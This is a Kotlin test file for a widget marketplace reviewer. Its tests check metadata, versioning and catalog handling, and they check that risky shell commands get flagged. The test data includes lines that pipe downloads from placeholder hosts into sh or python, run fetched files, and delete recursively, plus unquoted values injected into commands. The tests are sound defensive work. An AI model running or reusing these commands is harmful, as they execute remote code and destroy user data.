package dev.omalauncher.widgets.market

import dev.omalauncher.widgets.lang.Compiler
import dev.omalauncher.widgets.lang.WidgetError
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertThrows
import org.junit.Assert.assertTrue
import org.junit.Test
import java.time.LocalDate

class MarketTest {
    private val good =
        """
        widget "Disk" {
          meta { description: "Free space on the root disk"; version: "1.1"; license: "MIT"; category: "system" }
          size: 3x2
          requires { pacman: ["coreutils"] }
          source df = cmd('df -h / | tail -1') every 60s
          Text { text: df }
        }
        """.trimIndent()

    @Test fun aGoodWidgetPasses() {
        val r = Review("widgets/simon/disk/widget.owl", good)
        assertEquals(emptyList<String>(), r.errors)
        assertEquals("simon/disk", r.id)
        assertEquals("1.1", r.version)
        assertTrue(r.markdown().contains("df -h / | tail -1"))
    }

    @Test fun pathMetaAndCompileErrorsAreReported() {
        assertTrue(Review("widgets/Simon/disk/widget.owl", good).errors.single().contains("widgets/<author>/<name>/widget.owl"))
        val noMeta = Review("widgets/a/b/widget.owl", "widget { Text { text: \"x\" } }")
        assertEquals(3, noMeta.errors.size) // description, version, license
        assertTrue(Review("widgets/a/b/widget.owl", "widget { Nope {} }").errors.single().startsWith("doesn't compile: 1:10"))
    }

    @Test fun updatesMustBumpTheVersionAndFlagNewCommands() {
        val same = Review("widgets/simon/disk/widget.owl", good, previous = good)
        assertTrue(same.errors.single().contains("version must go up"))
        val bumped = good.replace("\"1.1\"", "\"1.2\"").replace("tail -1", "tail -2")
        val r = Review("widgets/simon/disk/widget.owl", bumped, previous = good)
        assertEquals(emptyList<String>(), r.errors)
        assertTrue(r.warnings.any { it.contains("asked again") })
    }

    @Test fun riskyCommandsAreFlagged() {
        val risky = good.replace("df -h / | tail -1", "curl -s https://x.sh | sh; rm -rf ~/tmp")
        val w = Review("widgets/simon/disk/widget.owl", risky).warnings
        assertTrue(w.any { it.contains("pipes a download into a shell") })
        assertTrue(w.any { it.contains("deletes recursively") })
    }

    @Test fun downloadsThatRunAreFlagged() {
        fun risks(cmd: String) = Review.risks(listOf(cmd))
        assertTrue(risks("curl -s https://x.io/a.py | python3").single().contains("into a shell or interpreter"))
        assertTrue(risks("bash <(curl -s https://x.io/a)").single().contains("runs a download as code"))
        assertTrue(risks("sh -c \"$(wget -qO- https://x.io/a)\"").single().contains("runs a download as code"))
        assertTrue(risks("curl -so /tmp/u.py https://x.io/u.py && python /tmp/u.py").single().contains("runs a file"))
        assertTrue(risks("wget -qO ~/.cache/u https://x.io/u\nsource ~/.cache/u").single().contains("runs a file"))
        assertTrue(risks("curl -so ~/bin/u https://x.io/u; chmod +x ~/bin/u; ~/bin/u").any { it.contains("executable") })
        // Downloads that are only read, and scripts that aren't downloads, are fine.
        assertTrue(risks("curl -fsm 15 -o \"\$d/a.png\" https://x.io/a.png || rm -f \"\$d/a.png\"").isEmpty())
        assertTrue(risks("curl -s https://x.io/a.json | jq -r .name").isEmpty())
        assertTrue(risks("curl -s https://x.io/a.json | python3 -c 'import json,sys; print(1)'").isEmpty())
        assertTrue(risks("python3 ~/bin/stats.py").isEmpty())
        // jq's `.` and a download read through a redirect are data too.
        assertTrue(risks("read -r a b < <(curl -s https://x.io/a.json | jq -r '.a, .b')").isEmpty())
        assertTrue(risks("curl -s https://x.io/a.json | jq '.[] | . as \$g | . + {t: \$g.t}'").isEmpty())
        assertTrue(risks("ssh host uptime; curl -s https://x.io").isEmpty())
    }

    @Test fun costlyPatternsAreFlagged() {
        fun costs(decls: String) =
            Review(
                "widgets/simon/w/widget.owl",
                "widget \"w\" {\n  meta { description: \"a test widget\"; version: \"1\"; license: \"MIT\"; category: \"system\" }\n" +
                    "  size: 3x2\n$decls\n  Text { text: \"x\" }\n}",
            ).warnings
        assertTrue(costs("  source a = cmd(\"free\") every 3s").any { it.contains("runs a command every 3s") })
        assertTrue(costs("  source a = http(\"https://example.com/a\") every 5s").any { it.contains("fetches every 5s") })
        assertTrue(costs("  source a = cmd(\"cat /proc/stat; sleep 1; cat /proc/stat\") every 10s").any { it.contains("prev()") })
        assertTrue(costs("  source a = cmd(\"for d in 1 2 3; do curl -s https://example.com/\$d; done\") every 5m").any { it.contains("curl once per item") })
        assertTrue(costs("  source a = cmd(\"for d in 1 2 3; do curl -s https://example.com/\$d &\ndone; wait\") every 5m").none { it.contains("curl once per item") })
        // Slow enough, no sleep, and curl outside a loop: nothing to say.
        assertEquals(emptyList<String>(), costs("  source a = cmd(\"sleep 1; date\") every 5m\n  source b = cmd(\"for f in *; do echo; done; curl -s https://example.com\") every 1h"))
    }

    @Test fun appsGoUnderApps() {
        val app = "app \"notes\" {\n  meta { owl: 8; description: \"notes on the phone\"; version: \"1.0\"; license: \"MIT\"; category: \"productivity\" }\n  Text { text: \"x\" }\n}"
        val r = Review("apps/simon/notes/app.owl", app)
        assertTrue(r.errors.isEmpty() && r.warnings.isEmpty())
        assertEquals("simon/notes", r.id)
        assertTrue(Review("widgets/simon/notes/widget.owl", app).errors.single().contains("it goes at apps/<author>/<name>/app.owl"))
        assertTrue(Review("apps/simon/disk/app.owl", good).errors.single().contains("it goes at widgets/"))
        val json = Catalog.write(listOf(r.entry(null)), "now", "apps")
        assertEquals("simon/notes", Catalog.parse(json, "apps").single().id)
        assertTrue(Catalog.parse(json).isEmpty())
    }

    @Test fun webFilesFromAnyServerAreFlagged() {
        fun risks(cmd: String) = Review.risks(listOf(cmd))
        assertTrue(risks("image GET https://…").single().contains("server put together while the widget runs"))
        assertTrue(risks("image GET https://x.test…").single().contains("server put together"))
        assertTrue(risks("sound GET https://…").single().contains("server put together"))
        assertTrue(risks("sound GET https://x.test/a/…").isEmpty())
        assertTrue(risks("image GET https://x.test/art/…").isEmpty())
        assertTrue(risks("image GET https://x.test").isEmpty())
    }

    @Test fun urlsWithAFixedHostAreNotFlagged() {
        assertTrue(Review.risks(listOf("http GET https://a.b/c/${Compiler.VALUE}?d=${Compiler.NUMBER}")).isEmpty())
        assertTrue(Review.risks(listOf("http GET (a URL built from widget values)")).single().contains("send its data anywhere"))
        assertTrue(Review.risks(listOf("http POST (a URL built from widget values)")).single().contains("send its data anywhere"))
        assertTrue(Review.risks(listOf("http POST https://a.b/c/${Compiler.VALUE}")).isEmpty())
        for (method in listOf("PUT", "PATCH", "DELETE")) {
            assertTrue(Review.risks(listOf("http $method (a URL built from widget values)")).single().contains("send its data anywhere"))
        }
    }

    @Test fun theStoreTakesValuesInCommandsOnlyQuoted() {
        fun review(cmd: String) =
            Review(
                "widgets/simon/disk/widget.owl",
                good.replace("license: \"MIT\"", "license: \"MIT\"; owl: 6")
                    .replace("Text { text: df }", "state v = \"x\"\n  onTap: run(\"$cmd\")\n  Text { text: df }"),
            )
        val bad = review("notify-send ${'$'}{v}")
        assertTrue(bad.errors.single().contains("run(…) is put together from widget values that aren't quoted"))
        val ok = review("notify-send ${'$'}{sh(v)}")
        assertEquals(emptyList<String>(), ok.errors)
        assertTrue(ok.markdown().contains("notify-send ${Compiler.VALUE}"))
        assertTrue(review("${'$'}{sh(v)} --help").warnings.any { it.contains("runs a program a widget value names") })
        assertTrue(review("bash -c ${'$'}{sh(v)}").warnings.any { it.contains("runs a widget value as code") })
        // A shared link only warns.
        assertTrue(Shared(good.replace("license: \"MIT\"", "license: \"MIT\"; owl: 6").replace("Text { text: df }", "state v = \"x\"\n onTap: run(\"echo ${'$'}{v}\")\n Text { text: df }")).risks.single().contains("can't be shown here"))
    }

    @Test fun catalogRoundTrips() {
        val e = Review("widgets/simon/disk/widget.owl", good).entry("widgets/simon/disk/preview.png")
        val parsed = Catalog.parse(Catalog.write(listOf(e), "2026-09-30T00:00:00Z"))
        assertEquals(listOf(e), parsed)
        // An index written before the compiler dropped `pacman: []` lists no packages.
        val empty = Catalog.write(listOf(e), "2026-09-30T00:00:00Z").replace("\"pacman\": [\"coreutils\"]", "\"pacman\": []")
        assertEquals(emptyMap<String, List<String>>(), Catalog.parse(empty).single().requires)
    }

    @Test fun themedPreviewsRoundTripAndFallBack() {
        val themes = mapOf("nord" to "widgets/simon/disk/previews/nord.webp", "tokyo-night" to "widgets/simon/disk/previews/tokyo-night.webp")
        val e = Review("widgets/simon/disk/widget.owl", good).entry("widgets/simon/disk/preview.png", themes)
        val parsed = Catalog.parse(Catalog.write(listOf(e), "2026-09-30T00:00:00Z")).single()
        assertEquals(e, parsed)
        assertEquals("widgets/simon/disk/previews/nord.webp", parsed.previewFor("nord"))
        assertEquals("widgets/simon/disk/preview.png", parsed.previewFor("my-own-theme"))
        assertEquals("widgets/simon/disk/preview.png", parsed.previewFor(null))
    }

    @Test fun orderTxtPutsWidgetsFirstAndLast() {
        val e = Review("widgets/simon/disk/widget.owl", good).entry(null)
        val all = listOf("clock", "crypto", "disk", "feeds", "todo", "xkcd").map { e.copy(id = "simon/$it", name = it) }
        val order = "# featured\nsimon/todo\nsimon/feeds\nsimon/gone\n\n...\nsimon/crypto\nsimon/clock\n"
        assertEquals(listOf("todo", "feeds", "disk", "xkcd", "crypto", "clock"), Catalog.ordered(all.reversed(), order).map { it.name })
        assertEquals(all, Catalog.ordered(all.reversed(), ""))
    }

    @Test fun categoriesComeFromAFixedList() {
        assertEquals("system", Review("widgets/simon/disk/widget.owl", good).entry(null).category)
        assertTrue(Review("widgets/simon/disk/widget.owl", good.replace("\"system\"", "\"misc\"")).errors.single().contains("category should be one of"))
        val none = Review("widgets/simon/disk/widget.owl", good.replace("; category: \"system\"", ""))
        assertTrue(none.warnings.any { it.startsWith("no category") })
        assertEquals(null, Catalog.parse(Catalog.write(listOf(none.entry(null)), "2026-09-30T00:00:00Z")).single().category)
    }

    @Test fun versionsCompareNumerically() {
        assertTrue(Catalog.compareVersions("1.10", "1.9") > 0)
        assertEquals(0, Catalog.compareVersions("2", "2.0.0"))
    }

    @Test fun widgetsDeclareTheLanguageLevelTheyNeed() {
        val current = good.replace("license: \"MIT\"", "license: \"MIT\"; owl: ${Compiler.LEVEL}")
        assertEquals(Compiler.LEVEL, Review("widgets/simon/disk/widget.owl", current).entry(null).owl)
        val newer = good.replace("license: \"MIT\"", "license: \"MIT\"; owl: ${Compiler.LEVEL + 1}")
        assertTrue(Review("widgets/simon/disk/widget.owl", newer).errors.single().contains("update the launcher"))
    }

    @Test fun olderLaunchersSeeNewerWidgetsAsUnsupported() {
        val e = Review("widgets/simon/disk/widget.owl", good).entry(null)
        val index = Catalog.write(listOf(e.copy(owl = Compiler.LEVEL + 1)), "2026-09-30T00:00:00Z")
        val parsed = Catalog.parse(index).single()
        assertFalse(parsed.supported)
        // A catalog from before the field existed means level 1.
        assertEquals(1, Catalog.parse(index.replace(",\n      \"owl\": ${Compiler.LEVEL + 1}", "")).single().owl)
    }

    @Test fun appsJsonListsItsEntriesUnderApps() {
        val e = Review("widgets/simon/disk/widget.owl", good).entry(null)
        val apps = Catalog.write(listOf(e), "2026-10-15T00:00:00Z").replace("\"widgets\": [", "\"apps\": [")
        assertEquals(e.id, Catalog.parse(apps, "apps").single().id)
        assertTrue(Catalog.parse(apps).isEmpty())
    }

    @Test fun newLastsThreeUtcDaysFromTheDayAdded() {
        val today = LocalDate.parse("2026-10-21")
        assertTrue(Catalog.isNew("2026-10-21", today))
        assertTrue(Catalog.isNew("2026-10-19", today))
        assertFalse(Catalog.isNew("2026-10-19", today.plusDays(1)))
        assertFalse(Catalog.isNew("2026-10-22", today))
        assertFalse(Catalog.isNew(null, today))
        assertFalse(Catalog.isNew("last week", today))
    }

    @Test fun addedAndNewRoundTripAndOlderCatalogsHaveNeither() {
        val e = Review("widgets/simon/disk/widget.owl", good).entry(null).copy(added = "2026-10-15", new = true)
        val index = Catalog.write(listOf(e), "2026-10-15T00:00:00Z")
        assertEquals(e, Catalog.parse(index).single())
        val old = Catalog.parse(index.replace(",\n      \"added\": \"2026-10-15\",\n      \"new\": true", "")).single()
        assertEquals(null, old.added)
        assertFalse(old.new)
    }

    @Test fun appIconsRoundTripAndWidgetsHaveNone() {
        val svg = "<svg viewBox=\"0 0 24 24\"><circle cx=\"12\" cy=\"12\" r=\"9\" fill=\"currentColor\"/></svg>"
        val app = "app \"notes\" {\n  meta { owl: 8; description: \"notes\"; version: \"1.0\"; license: \"MIT\" }\n  icon: \"\"\"$svg\"\"\"\n  Text { text: \"x\" }\n}"
        val e = Review("apps/simon/notes/app.owl", app).entry(null)
        assertEquals(svg, e.icon)
        val parsed = Catalog.parse(Catalog.write(listOf(e.copy(iconFile = "apps/simon/notes/store-icon.png")), "now", "apps"), "apps").single()
        assertEquals(svg, parsed.icon)
        assertEquals("apps/simon/notes/store-icon.png", parsed.iconFile)
        assertEquals(null, Review("widgets/simon/disk/widget.owl", good).entry(null).icon)
    }

    @Test fun screensRoundTripAndFallBackToTheDefaultTheme() {
        val screens = mapOf("nord" to listOf("apps/a/b/screens/2/nord.webp", "apps/a/b/screens/3/nord.webp"), Catalog.DEFAULT_THEME to listOf("apps/a/b/screens/2/${Catalog.DEFAULT_THEME}.webp"))
        val e = Review("widgets/simon/disk/widget.owl", good).entry(null).copy(screens = screens)
        val parsed = Catalog.parse(Catalog.write(listOf(e), "now")).single()
        assertEquals(screens, parsed.screens)
        assertEquals(screens["nord"], parsed.screensFor("nord"))
        assertEquals(screens[Catalog.DEFAULT_THEME], parsed.screensFor("my-own-theme"))
        assertTrue(Review("widgets/simon/disk/widget.owl", good).entry(null).screensFor("nord").isEmpty())
    }

    private val face =
        """
        face "manga" {
          meta { owl: 10; description: "A manga page for home"; version: "1.0"; license: "MIT"; category: "fun" }
          requires { pacman: ["coreutils"] }
          source up = cmd('uptime') every 60s
          Text { text: up }
        }
        """.trimIndent()

    // A later page needs no meta of its own but what it runs and needs; face.owl's describes the face.
    private val page2 =
        """
        face "boulevard" {
          meta { owl: 13 }
          requires { pacman: ["coreutils", "curl"] }
          source up = cmd('uptime') every 60s
          source q = cmd('curl -s https://example.com/q') every 60s
          Text { text: up + q }
        }
        """.trimIndent()

    @Test fun aFacesOtherPagesAreReviewedWithoutMeta() {
        val r = Review("faces/simon/manga/page-2.owl", page2)
        assertEquals(emptyList<String>(), r.errors)
        assertEquals("simon/manga", r.id)
        assertEquals(2, r.page)
        assertEquals(1, Review("faces/simon/manga/face.owl", face).page)
        assertTrue(r.markdown().startsWith("### ✅ `simon/manga`, page 2"))
        for (bad in listOf("faces/simon/manga/page-1.owl", "faces/simon/manga/page-02.owl", "widgets/simon/disk/page-2.owl", "apps/simon/notes/page-2.owl")) {
            assertTrue(bad, Review(bad, page2).errors.any { it.contains("page-2.owl, page-3.owl") })
        }
        // Changing one is still flagged for what it runs; its version is face.owl's business.
        val changed = Review("faces/simon/manga/page-2.owl", page2.replace("/q", "/r"), previous = page2)
        assertEquals(emptyList<String>(), changed.errors)
        assertTrue(changed.warnings.any { it.contains("asked again") })
    }

    @Test fun aFacesPagesShareOneApprovalAndRoundTrip() {
        val page = Review("faces/simon/manga/page-2.owl", page2)
        val e = Review("faces/simon/manga/face.owl", face).entry("faces/simon/manga/preview.png", pages = listOf(page))
        assertEquals(listOf(FacePage("faces/simon/manga/page-2.owl", page.sha256)), e.pages)
        assertEquals(mapOf("pacman" to listOf("coreutils", "curl")), e.requires)
        assertEquals(listOf("uptime", "curl -s https://example.com/q"), e.commands)
        // Pages at owl 13 still need 14: launchers before it would install page 1 alone.
        assertEquals(Review.PAGES_LEVEL, e.owl)
        assertEquals(10, Review("faces/simon/manga/face.owl", face).entry(null).owl)
        assertEquals("A manga page for home", e.description)
        val json = Catalog.write(listOf(e), "now", "faces")
        assertEquals(listOf(e), Catalog.parse(json, "faces"))
        // Half a face is left out; one from before pages has none.
        assertTrue(Catalog.parse(json.replace("\"sha256\": \"${page.sha256}\"", "\"sha\": \"x\""), "faces").isEmpty())
        assertTrue(Review("faces/simon/manga/face.owl", face).entry(null).let { Catalog.parse(Catalog.write(listOf(it), "now", "faces"), "faces").single().pages.isEmpty() })
    }

    @Test fun aNewerCatalogFormatAsksForAnUpdate() {
        val e = assertThrows(WidgetError::class.java) { Catalog.parse("{\"format\": ${Catalog.FORMAT + 1}, \"widgets\": []}") }
        assertTrue(e.message!!.contains("newer launcher"))
    }
}
